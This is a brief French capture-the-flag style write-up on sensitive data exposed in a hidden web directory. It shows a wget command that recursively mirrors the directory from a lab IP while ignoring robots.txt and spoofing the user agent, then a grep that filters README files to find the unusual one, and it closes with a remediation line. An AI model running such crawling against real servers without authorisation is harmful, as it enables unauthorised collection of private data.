# Exposition de donees

## Exploitation

On commence par download tout le dossier :

```bash
wget --no-clobber --convert-links --random-wait -r -p  -E -e robots=off -U mozilla http://192.168.122.55/.hidden
```

Puis find tout ce qui n'est pas commun dans les README :

```bash
find . -type f -name README -exec grep -v -e voisin -e aide -e Toujours -e toujours {} \;
```

## Resolution

Ne pas exposer de donées sensibles sur le server meme cachées